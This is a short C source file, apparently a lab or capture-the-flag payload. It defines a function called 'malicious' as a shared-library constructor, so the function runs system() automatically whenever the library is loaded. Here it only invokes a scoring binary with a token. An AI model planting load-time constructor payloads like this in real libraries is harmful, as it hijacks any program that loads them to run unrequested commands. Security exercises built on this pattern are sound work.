#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
       system("/usr/local/bin/score a8b36d53-80b2-4f9d-930d-34bf9487d33d");
}
